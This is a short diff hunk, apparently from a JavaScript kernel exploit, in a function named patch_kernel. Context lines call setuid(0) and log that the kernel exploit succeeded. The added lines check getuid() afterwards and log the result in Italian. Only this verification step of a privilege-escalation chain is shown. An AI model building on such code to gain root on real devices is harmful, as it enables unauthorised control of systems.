@@ -1612,6 +1612,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+
+    const uid = sysi('getuid').low;
+   log(`dopo setuid, getuid() = ${uid}`);
     //alert("kernel exploit succeeded!");
 }
 
